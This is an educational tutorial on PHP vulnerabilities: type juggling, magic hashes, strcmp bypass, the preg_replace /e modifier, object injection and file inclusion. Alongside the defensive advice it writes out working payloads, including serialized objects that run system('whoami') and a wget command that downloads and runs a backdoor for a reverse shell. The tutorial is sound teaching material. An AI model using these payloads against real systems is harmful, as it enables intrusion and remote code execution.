Today, even if there are better options for the server-side choice, PHP is still pretty popular.</p><p><img src=./assets/language-stats.png alt="Server Side Languages Popularity"></p><p>Source <a href=https://w3techs.com/technologies/overview/programming_language>here</a>.</p><p>There are also lots of different PHP versions, each with its own vulnerabilities.
A small insight into the distribution of versions across the web is:</p><p><img src=./assets/version-stats.png alt="PHP Versions Popularity"></p><p>Source <a href=https://w3techs.com/technologies/details/pl-php>here</a>.</p><p>In this session we will focus on some exotic attacks against specific PHP functions and functionalities, as well as a quick overview of other interesting quirks.</p><h1 id=php-type-juggling>PHP Type Juggling</h1><p>Much like Python and Javascript, PHP is a dynamically typed language.
This means that variable types are checked while the program is executing.
For example, let’s take a variable called <code>$var</code>.
If we assign a string value to it, it becomes a string.
If an integer value is then assigned to <code>$var</code>, it becomes an integer.</p><p>Dynamic typing allows developers to be more flexible when using PHP.
But this kind of flexibility sometimes causes unexpected errors in the program flow and can even introduce critical vulnerabilities into the application.</p><p>In this section we will discuss <strong>PHP type juggling</strong> and how this can lead to authentication bypass vulnerabilities.</p><p><img src=./assets/type-juggling.png alt="Type Juggling examples"></p><h2 id=how-php-compares-values>How PHP compares values</h2><p>PHP has a feature called &ldquo;type juggling&rdquo; or &ldquo;type coercion&rdquo;.
This means that during the comparison of variables of different types, PHP will first convert them to a common, comparable type.</p><p>For example, when the program is comparing the string <code>"7"</code> and the integer <code>7</code> in the scenario below:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>7</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000>$example_str</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$example_str</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
       <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;PHP can compare ints and strings.&#34;</span><span style=color:#000;font-weight:700>);</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>The code will run without errors and output <code>PHP can compare ints and strings.</code>.
This behavior is very helpful when you want your program to be flexible in dealing with different types of user input.</p><p>However, it is also important to note that this behavior is also a major source of bugs and security vulnerabilities.</p><p>For example, when PHP needs to compare the string <code>"7 puppies"</code> to the integer <code>7</code>, PHP will attempt to extract the integer from the string.
So this comparison will evaluate to <strong>True</strong>.</p><p><code>("7 puppies" == 7) -> True</code></p><p>But what if the string that is being compared does not contain an integer? The string will then be converted to a <code>"0"</code>.
So the following comparison will also evaluate to <strong>True</strong>:</p><p><code>("Puppies" == 0) -> True</code></p><p>You can try this yourself using an online PHP sandbox, such as <a href=http://www.writephponline.com/>this one</a>.</p><h2 id=loose-comparison-vs-strict-comparison--vs->Loose Comparison vs. Strict Comparison (<code>==</code> vs <code>===</code>)</h2><p>The <code>==</code> and <code>!=</code> are the default comparison operators in other languages.
But PHP has two main comparison modes, let’s call them <strong>loose</strong> (<code>==</code> and <code>!=</code>) and <strong>strict</strong> (<code>===</code> and <code>!==</code>).</p><p>The strict mode works by also comparing the type of the variable as well as the value.
So, for example, if we compare the number <code>7</code> and the string <code>"7"</code>, the result will be false because of the different types.
This time, PHP won’t use type juggling before comparing the values.</p><p>The following tables showcase the difference between the two comparison modes:</p><table><thead><tr><th>Loose comparison</th><th>Strict comparison</th></tr></thead><tbody><tr><td><img src=./assets/loose-comparison.png alt="Loose comparison"></td><td><img src=./assets/strict-comparison.png alt="Strict comparison"></td></tr></tbody></table><p>However, loose type comparison behavior like the one presented above is pretty common in PHP and many built-in functions work in the same way.
You can probably already see how this can be very problematic, but how exactly can hackers exploit this behavior?</p><h2 id=how-vulnerability-arises>How vulnerability arises</h2><p>The most common way that this particularity in PHP is exploited is by using it to bypass authentication.
Let’s say the PHP code that handles authentication looks like this:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$_POST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#34;password&#34;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#4e9a06>&#34;Admin_Password&#34;</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#000>login_as_admin</span><span style=color:#000;font-weight:700>();</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Then, simply submitting an integer input of <code>0</code> would successfully log you in as admin, since this will evaluate to <strong>True</strong>:</p><p><code>(0 == "Admin_Password") -> True</code></p><h3 id=conditions-of-exploitation>Conditions of exploitation</h3><p>However, this vulnerability is not always exploitable and often needs to be combined with a deserialization flaw.
The reason for this is that <strong>POST</strong>, <strong>GET</strong> parameters and <strong>cookie</strong> values are, for the most part, passed as strings or arrays into the program.</p><p>If the <strong>POST</strong> parameter from the example above was passed into the program as a string, PHP would be comparing two strings, and no type conversion would be needed.
And <code>"0"</code> and <code>"Admin_Password"</code> are, obviously, different strings.</p><p><code>("0" == "Admin_Password") -> False</code></p><p>However, type juggling issues can be exploited if the application accepts the input via functions like <code>json_decode()</code> or <code>unserialize()</code>.
This way, it would be possible for the end-user to specify the type of input passed in.</p><p><code>{"password": "0"}</code>
<code>{"password": 0}</code></p><p>Consider the above JSON blobs.
The first one would cause the password parameter to be treated as a string whereas the second one would cause the input to be interpreted as an integer by PHP.
This gives an attacker fine-grained control of the input data type and therefore the ability to exploit type juggling issues.</p><h2 id=avoiding-type-juggling-issues-in-php-code>Avoiding type juggling issues in PHP code</h2><p>As a developer, there are several steps that you can take to prevent these vulnerabilities from happening.</p><h3 id=use-strict-comparison-operators>Use strict comparison operators</h3><p>When comparing values, always try to use the type-safe comparison operator <code>===</code> instead of the loose comparison operator <code>==</code>.
This will ensure that PHP does not type juggle and the operation will only return <strong>True</strong> if the types of the two variables also match.
This means that <code>(7 === "7")</code> will return <strong>False</strong>.</p><h3 id=specify-the-strict-option-for-functions-that-compare>Specify the &ldquo;strict&rdquo; option for functions that compare</h3><p>Always consult the PHP manual on individual functions to check if they use loose comparison or type-safe comparison.
See if there is an option to use strict comparison and specify that option in your code.</p><p>For example, PHP’s <code>in_array()</code> uses loose comparison by default.
But you can make it switch to type-safe comparison by specifying the <code>strict</code> option.
If the function only provides loose comparison, avoid using that function and search for alternatives instead.</p><h3 id=avoid-typecasting-before-comparison>Avoid typecasting before comparison</h3><p>Avoid typecasting right before comparing values, as this will essentially deliver the same results as type juggling.
For example, before typecasting, the following three variables are all seen as distinct by the type-safe operator.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>7</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000>$example_str</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7_string&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000>$example_str_2</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>===</span> <span style=color:#000>$example_str</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#8f5902;font-style:italic>// This condition statement will return False
</span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;This will not print.&#34;</span><span style=color:#000;font-weight:700>);</span>
    <span style=color:#000;font-weight:700>}</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>===</span> <span style=color:#000>$example_str_2</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
       <span style=color:#8f5902;font-style:italic>// This condition statement will return False
</span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;This will not print.&#34;</span><span style=color:#000;font-weight:700>);</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Whereas after typecasting, PHP will only preserve the number extracted from a string, and <code>"7_string"</code> will become the integer <code>7</code>.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>7</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000>$example_str</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;7_string&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$example_int</span> <span style=color:#ce5c00;font-weight:700>===</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>int</span><span style=color:#000;font-weight:700>)</span><span style=color:#000>$example_str</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#8f5902;font-style:italic>// This condition statement will return True
</span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>echo</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;This will print.&#34;</span><span style=color:#000;font-weight:700>);</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><h1 id=more-php-vulnerabilities>More PHP vulnerabilities</h1><h2 id=magic-hashes>Magic hashes</h2><p>Magic hashes are hashes that start with a leading <code>0e</code> (the scientific notation for &ldquo;0 to the power of some value&rdquo;) and have only numbers after that.</p><p>Let&rsquo;s say you stored a hashed password that looks like this: <code>0e462097431906509019562988736854</code>, which is the value returned by <code>md5(240610708)</code>.
Being a magic hash, if we use the loose comparison operator <code>==</code> against the user input and provide <code>0</code> as value, the following code will always return &ldquo;Matched&rdquo;.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#000>$passwordHash</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>md5</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;240610708&#39;</span><span style=color:#000;font-weight:700>);</span>
    <span style=color:#8f5902;font-style:italic>// $_GET[&#39;password&#39;] = &#39;0&#39;
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$passwordHash</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;password&#39;</span><span style=color:#000;font-weight:700>])</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Matched&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
  <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Not matched&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Below is a table of such hashes discovered so far:</p><table><thead><tr><th>Hash Type</th><th>Hash Length</th><th>&ldquo;Magic&rdquo; Number / String</th><th>Magic Hashes</th><th>Found By</th></tr></thead><tbody><tr><td>md2</td><td>32</td><td>505144726</td><td>0e015339760548602306096794382326</td><td>WhiteHat Security, Inc.</td></tr><tr><td>md4</td><td>32</td><td>48291204</td><td>0e266546927425668450445617970135</td><td>WhiteHat Security, Inc.</td></tr><tr><td>md5</td><td>32</td><td>240610708</td><td>0e462097431906509019562988736854</td><td>Michal Spacek</td></tr><tr><td>md5</td><td>32</td><td>QNKCDZO</td><td>0e830400451993494058024219903391</td><td>-</td></tr><tr><td>sha1</td><td>40</td><td>10932435112</td><td>0e07766915004133176347055865026311692244</td><td>Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham</td></tr><tr><td>sha224</td><td>56</td><td>–</td><td>–</td><td>–</td></tr><tr><td>sha256</td><td>64</td><td>–</td><td>–</td><td>–</td></tr><tr><td>sha384</td><td>96</td><td>–</td><td>–</td><td>–</td></tr><tr><td>sha512</td><td>128</td><td>–</td><td>–</td><td>–</td></tr><tr><td>ripemd128</td><td>32</td><td>315655854</td><td>0e251331818775808475952406672980</td><td>WhiteHat Security, Inc.</td></tr><tr><td>ripemd160</td><td>40</td><td>20583002034</td><td>00e1839085851394356611454660337505469745</td><td>Michael A Cleverly</td></tr></tbody></table><p>Even though you won&rsquo;t find such examples on a daily basis, it&rsquo;s important to know that there is such a possibility and beware of using loose comparison.
It&rsquo;s just another example of how dangerous it is.</p><h2 id=bypassing-strcmp-function>Bypassing <code>strcmp()</code> function</h2><p>The <code>strcmp($str1, $str2)</code> function compares two strings.
The only possible return values are:</p><blockquote><p><strong>0</strong>, if <code>$str1</code> is equal to <code>$str2</code>
<strong>&lt; 0</strong>, if <code>$str1</code> is less than <code>$str2</code>
<strong>> 0</strong>, if <code>$str1</code> is greater than <code>$str2</code></p></blockquote><p>But what happens if we use the following code to check for a password?</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>strcmp</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$password</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>$_POST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;password&#39;</span><span style=color:#000;font-weight:700>])</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#000>$success</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>true</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#000>$success</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87;font-weight:700>false</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>We could provide an array in the POST parameter instead of a string (<code>password[]=x</code>), resulting in PHP throwing a warning:</p><p><code>Warning: strcmp() expects parameter 2 to be string, array given in http://example.com/index.php on line 5</code></p><p>The interesting part here is that, even though PHP throws a warning, it goes on comparing the result of <code>strcmp()</code>, which is <code>NULL</code>, to <code>0</code> using the previously discussed loose comparison operator.
This means that <code>NULL</code> will be equal to <code>0</code> and so we could bypass the authentication.</p><h2 id=using-preg_replace-to-execute-commands>Using <code>preg_replace()</code> to execute commands</h2><p>The <code>preg_replace()</code> function is used to perform regular expressions search and replace.
A legitimate use of it could be:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#000>$in</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;Somewhere, something incredible is waiting to be known&#39;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#000>preg_replace</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;replace&#39;</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>$_GET</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;with&#39;</span><span style=color:#000;font-weight:700>],</span> <span style=color:#000>$in</span><span style=color:#000;font-weight:700>);</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>The code will take a user-supplied regular expression and replace whatever it matches with a user-supplied string.
So if we were to call <code>preg_replace.php?replace=/Known/i&with=eaten</code>, the script would perform a case-insensitive regex search (the <code>i</code> modifier) and echo <code>Somewhere, something incredible is waiting to be eaten</code>.
Seems safe enough, right?</p><p>Well, not at all.
The above code is vulnerable to code injection as it fails to account for dangerous <a href=https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php>PCRE modification flags</a> in the input string.
Most modifiers are quite harmless and let you do things like case-insensitive and multi-line searches, however one modifier, <code>e</code> will cause PHP to execute the result of the <code>preg_replace()</code> operation as PHP code.</p><p>The payload is: <code>?replace=/Known/e&with=system(‘whoami’)</code></p><p>This is extremely dangerous, as it gives an attacker the opportunity to execute any PHP code.</p><p>It has been <strong>deprecated</strong> since <strong>PHP 5.5.0</strong>, and <strong>removed completely</strong> in <strong>PHP 7.0.0</strong>, because of its recklessly insecure nature.
The replacement function is called <code>preg_replace_callback()</code>, which uses a callback.
As many people are still using older versions of PHP, it is still dangerous and even in the versions where it was deprecated, the option will still work (it will generate a warning at a log level turned off by default), so the issue will be around for a while yet.</p><h1 id=php-object-injection--php-insecure-object-deserialization>PHP Object Injection / PHP Insecure Object Deserialization</h1><p><strong>PHP Object Injection</strong> is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.
The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the <code>unserialize()</code> PHP function.
Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable <code>unserialize()</code> call, resulting in an arbitrary PHP object(s) injection into the application scope.</p><p>In order to go further, we need to know some things about <strong>PHP magic methods</strong>.
The &ldquo;magic&rdquo; methods are nothing more than a set of special named functions, starting with two underscores, which denote methods that will be triggered in response to particular PHP events.
A well known example, which you should be familiar with from other programming languages, is the <code>__construct()</code> method, which is a class constructor.</p><p>The following magic methods will be helpful in exploiting a PHP Object injection vulnerability:</p><ul><li><code>__wakeup()</code> - when an object is unserialized.</li><li><code>__destruct()</code> - when an object is deleted.</li><li><code>__toString()</code> - when an object is converted to a string.</li></ul><p>A more comprehensive list of PHP magic methods would be this one:</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><code>__construct()</code></td><td><code>__set()</code></td><td><code>__toString()</code></td></tr><tr><td><code>__destruct()</code></td><td><code>__isset()</code></td><td><code>__invoke()</code></td></tr><tr><td><code>__call()</code></td><td><code>__unset()</code></td><td><code>__set_state()</code></td></tr><tr><td><code>__callStatic()</code></td><td><code>__sleep()</code></td><td><code>__clone()</code></td></tr><tr><td><code>__get()</code></td><td><code>__wakeup()</code></td><td><code>__debugInfo()</code></td></tr></tbody></table><h3 id=exploit-with-the-__wakeup-in-the-unserialize-function>Exploit with the <code>__wakeup</code> in the <code>unserialize()</code> function</h3><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#204a87;font-weight:700>class</span> <span style=color:#000>PHPObjectInjection</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#204a87;font-weight:700>public</span> <span style=color:#000>$inject</span><span style=color:#000;font-weight:700>;</span>
        <span style=color:#204a87;font-weight:700>function</span> <span style=color:#000>__construct</span><span style=color:#000;font-weight:700>()</span> <span style=color:#000;font-weight:700>{</span>

        <span style=color:#000;font-weight:700>}</span>
        <span style=color:#204a87;font-weight:700>function</span> <span style=color:#000>__wakeup</span><span style=color:#000;font-weight:700>()</span> <span style=color:#000;font-weight:700>{</span>
            <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>isset</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$this</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>inject</span><span style=color:#000;font-weight:700>))</span> <span style=color:#000;font-weight:700>{</span>
                <span style=color:#204a87;font-weight:700>eval</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$this</span><span style=color:#ce5c00;font-weight:700>-&gt;</span><span style=color:#c4a000>inject</span><span style=color:#000;font-weight:700>);</span>
            <span style=color:#000;font-weight:700>}</span>
        <span style=color:#000;font-weight:700>}</span>
    <span style=color:#000;font-weight:700>}</span>
    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>isset</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_REQUEST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;r&#39;</span><span style=color:#000;font-weight:700>]))</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#000>$var1</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>unserialize</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_REQUEST</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;r&#39;</span><span style=color:#000;font-weight:700>]);</span>
        <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>is_array</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$var1</span><span style=color:#000;font-weight:700>))</span> <span style=color:#000;font-weight:700>{</span>
            <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;&lt;br/&gt;&#34;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$var1</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#4e9a06>&#34; - &#34;</span> <span style=color:#ce5c00;font-weight:700>.</span> <span style=color:#000>$var1</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>1</span><span style=color:#000;font-weight:700>];</span>
        <span style=color:#000;font-weight:700>}</span>
    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;&#34;</span><span style=color:#000;font-weight:700>;</span> <span style=color:#8f5902;font-style:italic># nothing happens here
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Payload:</p><pre><code># Basic serialized data
a:2:{i:0;s:4:&quot;XVWA&quot;;i:1;s:33:&quot;Xtreme Vulnerable Web Application&quot;;}

# Command execution
O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:17:&quot;system('whoami');&quot;;}
</code></pre><p>This vulnerability is <strong>extremely dangerous</strong>, as it could also lead to an <strong>RCE (Remote Code Execution)</strong> exploit.
An attacker could use a payload which downloads a script and starts a reverse shell connected to the web server.
The payload could look like this:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#204a87;font-weight:700>class</span> <span style=color:#000>PHPObjectInjection</span>
    <span style=color:#000;font-weight:700>{</span>
        <span style=color:#8f5902;font-style:italic>// Change URL/ filename to match your setup
</span><span style=color:#8f5902;font-style:italic></span>        <span style=color:#204a87;font-weight:700>public</span> <span style=color:#000>$inject</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;system(&#39;wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php&#39;);&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span>
    <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#000>urlencode</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>serialize</span><span style=color:#000;font-weight:700>(</span><span style=color:#204a87;font-weight:700>new</span> <span style=color:#000>PHPObjectInjection</span><span style=color:#000;font-weight:700>));</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Of course, there are many other methods to achieve a reverse shell once you have the ability to execute code on the target machine.</p><h3 id=authentication-bypass---type-juggling>Authentication bypass - Type juggling</h3><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#ce5c00;font-weight:700>&lt;?</span><span style=color:#000>php</span>
    <span style=color:#204a87;font-weight:700>include</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;credentials.php&#34;</span><span style=color:#000;font-weight:700>);</span>

    <span style=color:#8f5902;font-style:italic>// $adminName = &#34;random&#34;;
</span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// $adminPassword = &#34;pass&#34;;
</span><span style=color:#8f5902;font-style:italic></span>
    <span style=color:#000>$data</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>unserialize</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>$_COOKIE</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;auth&#39;</span><span style=color:#000;font-weight:700>]);</span>

    <span style=color:#204a87;font-weight:700>if</span> <span style=color:#000;font-weight:700>(</span><span style=color:#000>$data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;username&#39;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$adminName</span> <span style=color:#ce5c00;font-weight:700>&amp;&amp;</span> <span style=color:#000>$data</span><span style=color:#000;font-weight:700>[</span><span style=color:#4e9a06>&#39;password&#39;</span><span style=color:#000;font-weight:700>]</span> <span style=color:#ce5c00;font-weight:700>==</span> <span style=color:#000>$adminPassword</span><span style=color:#000;font-weight:700>)</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;You logged in as admin!&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span> <span style=color:#204a87;font-weight:700>else</span> <span style=color:#000;font-weight:700>{</span>
        <span style=color:#204a87;font-weight:700>echo</span> <span style=color:#4e9a06>&#34;Login failed!&#34;</span><span style=color:#000;font-weight:700>;</span>
    <span style=color:#000;font-weight:700>}</span>
<span style=color:#8f5902;font-style:italic>?&gt;</span><span style=color:#a40000>
</span></code></pre></div><p>Payload: <code>a:2:{s:8:"username";b:1;s:8:"password";b:1;}</code></p><h1 id=local-file-inclusion-lfi--remote-file-inclusion-rfi>Local File Inclusion (LFI) / Remote File Inclusion (RFI)</h1><p>An attacker can use <strong>Local File Inclusion (LFI)</strong> to trick the web application into exposing or running files on the web server.
An <strong>LFI</strong> attack may lead to <strong>Information Disclosure</strong>, <strong>Remote Code Execution (RCE)</strong>, or even <strong>Cross-site Scripting (XSS)</strong>.</p><p>Typically, <strong>LFI</strong> occurs when an application uses the path to a file as input.
If the application treats this input as trusted, a local file may be used in the include statement.</p><p>Using <strong>Remote File Inclusion (RFI)</strong>, an attacker can cause the web application to include a remote file.
This is possible for web applications that dynamically include external files or scripts.
Potential web security consequences of a successful <strong>RFI</strong> attack range from <strong>Sensitive Information Disclosure</strong> and <strong>Cross-site Scripting (XSS)</strong> to <strong>Remote Code Execution (RCE)</strong> and, as a final result, <strong>full system compromise</strong>.</p><p><strong>Remote file inclusion</strong> attacks usually occur when an application receives a path to a file as input for a web page and does not properly sanitize it.
